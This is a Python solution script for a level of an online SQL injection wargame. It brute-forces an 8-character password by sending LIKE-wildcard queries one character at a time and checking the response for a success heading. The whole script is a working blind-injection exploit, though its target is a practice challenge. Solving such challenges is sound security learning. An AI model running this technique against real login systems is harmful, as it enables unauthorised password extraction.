import sys
import time

import requests
from bs4 import BeautifulSoup

URL = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
PHPSESSID = sys.argv[1]
CHARSET = "0123456789abcdef"

sess = requests.Session()
sess.cookies.set("PHPSESSID", PHPSESSID)


def next_char(current_password: str) -> str:
    print(f"[+] Trying: ", end="")
    answer = ""
    for ch in CHARSET:
        print(ch, end="", flush=True)
        query = f"{current_password}{ch}{'_' * (7 - len(current_password))}"
        res = sess.get(URL, params={"pw": query})
        time.sleep(0.1)
        soup = BeautifulSoup(res.text, features="html.parser")
        if soup.h2 is not None:
            answer = ch
            break
    print()
    return answer


password = ""
for i in range(8):
    password += next_char(password)
    print(f"[+] Current password: {password}")
print(password)
